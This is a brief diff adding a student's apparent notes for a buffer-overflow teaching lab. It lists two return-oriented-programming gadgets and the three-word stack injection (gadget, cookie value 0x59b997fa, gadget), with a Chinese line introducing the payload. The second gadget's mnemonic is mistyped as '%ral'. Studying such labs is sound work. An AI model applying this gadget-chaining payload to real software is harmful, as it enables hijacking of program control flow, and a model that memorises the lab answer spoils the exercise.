@@ -1,0 +1,11 @@
+4019ab 58 90 c3  -> popq %rax  ret
+4019a2 48 89 c7 c3 -> movq %ral, %rdi ret
+
+因此栈注入内容是
+
+0x4019ab
+0x59b997fa
+0x4019a2
+
+
+
